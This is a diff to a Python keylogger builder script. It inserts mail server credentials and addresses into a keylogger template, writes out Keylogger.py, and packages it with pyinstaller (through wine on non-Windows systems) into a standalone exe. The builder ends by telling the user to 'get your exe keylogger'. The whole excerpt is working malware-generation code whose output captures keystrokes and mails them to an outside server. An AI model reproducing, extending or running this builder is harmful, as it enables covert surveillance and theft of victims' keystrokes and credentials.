@@ -50,18 +50,18 @@ def main(argv):
 		keyconn = "interval=" + reportduration + "\nrunobjects('" + gserver + "' , '" + str(gport) + "' , '" + guser + "' , '" + gpass + "' , '" + mailfrom + "' , '" + mailto + "' , '" + subject + "')"
 		klgstr = getfcontent("templates/Gkeyloggertemplate.py")
 		klgstr += keyconn
-		writefcontent("Keylogger.pyw",klgstr)
-		print(getfcontent("Keylogger.pyw"))
+		writefcontent("Keylogger.py",klgstr)
+		print(getfcontent("Keylogger.py"))
 		if sys.platform != "win32":
 			if iconfile != 'NONE':
-				os.system("sudo wine pyinstaller --onefile -i " + iconfile + " --hidden-import='/root/.wine/drive_c/users/root/Local Settings/Application Data/Programs/Python/Python38-32/Lib/site-packages/pywin32_system32/pywintypes32.dll' Keylogger.pyw")
+				os.system("sudo wine pyinstaller --onefile -i " + iconfile + " Keylogger.py")
 			else:
-				os.system("sudo wine pyinstaller --onefile --hidden-import='/root/.wine/drive_c/users/root/Local Settings/Application Data/Programs/Python/Python38-32/Lib/site-packages/pywin32_system32/pywintypes32.dll' Keylogger.pyw")
+				os.system("sudo wine pyinstaller --onefile Keylogger.py")
 		else:
 			if iconfile != 'NONE':
-				os.system("pyinstaller --onefile -i " + iconfile + " --hidden-import='pywintypes32.dll' Keylogger.pyw")
+				os.system("pyinstaller --onefile -i " + iconfile + " Keylogger.py")
 			else:
-				os.system("pyinstaller --onefile --hidden-import='pywintypes32.dll' Keylogger.pyw")
+				os.system("pyinstaller --onefile Keylogger.py")
 		print("open dist folder and get your exe keylogger ")
 	else:
 		print('Not implemented yet')
